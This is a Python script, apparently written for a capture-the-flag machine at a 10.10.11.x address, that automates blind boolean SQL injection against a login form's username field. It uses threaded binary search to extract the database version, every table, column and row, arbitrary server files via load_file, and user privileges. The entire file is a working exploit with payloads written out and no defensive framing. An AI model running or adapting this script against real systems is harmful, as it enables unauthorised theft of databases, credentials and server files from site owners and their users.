import base64
import binascii
import json
import requests
import signal
import sys
import time

from concurrent.futures import ThreadPoolExecutor
from typing import Callable as Func, Dict, List, Tuple


signal.signal(signal.SIGINT, lambda *_: print('Quitting...') or sys.exit(1))

TABLES = 'information_schema.tables'
COLUMNS = 'information_schema.columns'
COUNT = 'count(*)'

url = 'http://10.10.11.101/administrative'


def do_sqli(data: Dict[str, str]) -> bool:
    return 'error' not in requests.post(url, data=data).text


def binary_search(checker: Func[[int], bool], left: int, right: int) -> int:
    mid = (left + right) // 2

    if mid == left and checker(mid):
        return -1

    if not checker(mid) and (mid == right or checker(mid + 1)):
        return mid

    if not checker(mid):
        return binary_search(checker, mid + 1, right)

    return binary_search(checker, left, mid)


def get_data_length(payload: str, n: int) -> Dict[str, str]:
    return {
        'uname': f"' or length(convert(length({payload}),char))={n};-- -",
        'password': 'asdf'
    }


def get_data_content(payload: str, i: int, c: int) -> Dict[str, str]:
    return {
        'uname': f"' or ascii(substr({payload},{i + 1},1))<{c};-- -",
        'password': 'asdf'
    }


def get_length(payload: str) -> int:
    n = 1

    while not do_sqli(get_data_length(payload, n)):
        n += 1

        if n > 10:
            print('NOT FOUND')
            sys.exit()

    data = [' ' for _ in range(n)]

    payload = f'convert(length({payload}),char)'
    start_threads(n, (data, payload, ord('0'), ord('9')))

    return int(''.join(data))


def start_threads(n: int, args: Tuple[List[str], str, int, int]):
    with ThreadPoolExecutor(max_workers=100) as pool:
        for i in range(n):
            pool.submit(get_content, *args, i)


def get_content(data: List[str], payload: str, start: int, end: int, i: int):
    def checker(c: int) -> bool:
        return do_sqli(get_data_content(payload, i, c))

    ascii_value = binary_search(checker, start, end)

    data[i] = chr(ascii_value)


def dump_content(payload: str) -> str:
    n = get_length(payload)
    data = ['_' for _ in range(n)]
    start_threads(n, (data, payload, 32, 126))

    return ''.join(data)


def sql(column: str, table: str, where: str = '', limit: int = None) -> str:
    if not where and limit is None:
        return f'(select {column} from {table})'
    elif limit is None:
        return f'(select {column} from {table} where {where})'
    elif not where:
        return f'(select {column} from {table} limit {limit},1)'

    return f'(select {column} from {table} where {where} limit {limit},1)'


def dump_db():
    print('Version:', dump_content('version()'))
    db = {}
    database = dump_content('database()')
    n_tables = dump_content(
        sql(COUNT, TABLES, f"table_schema='{database}'"))

    db[database] = {}

    for i in range(int(n_tables)):
        table_name = dump_content(
            sql('table_name', TABLES, f"table_schema='{database}'", i))

        db[database][table_name] = {}

        if table_name == 'stories':
            continue

        n_cols = dump_content(
            sql(COUNT, COLUMNS, f"table_name='{table_name}'"))
        n_rows = dump_content(
            sql(COUNT, table_name))

        for j in range(int(n_cols)):
            column_name = dump_content(
                sql('column_name', COLUMNS, f"table_name='{table_name}'", j))

            if db[database][table_name].get(column_name) is None:
                db[database][table_name][column_name] = []

            if column_name in {'ganalytics', 'date_created'}:
                continue

            for k in range(int(n_rows)):
                row_value = dump_content(
                    sql(column_name, table_name, limit=k))
                db[database][table_name][column_name].append(row_value)

    print(json.dumps(db, indent=2))


def get_file(filename):
    file = dump_content(f"to_base64(load_file('{filename}'))")

    try:
        print(base64.b64decode(file).decode())
    except binascii.Error:
        print(file)


def get_privileges():
    user = dump_content('current_user()')
    print('User:', user)
    table_name = 'information_schema.user_privileges'
    privileges = {}

    column_names = ['grantee', 'privilege_type',
                    'table_catalog', 'is_grantable']
    n_rows = dump_content(sql(COUNT, table_name))

    for column_name in column_names:
        if privileges.get(column_name) is None:
            privileges[column_name] = []

        for k in range(int(n_rows)):
            row_value = dump_content(
                sql(column_name, table_name, limit=k))
            privileges[column_name].append(row_value)

    print(json.dumps(privileges, indent=2))


def main():
    start = time.time()

    if len(sys.argv) > 1:
        filename = sys.argv[1]

        if filename == 'privileges':
            get_privileges()
        else:
            get_file(filename)
    else:
        dump_db()

    print('Time:', time.time() - start, 's')


if __name__ == '__main__':
    main()
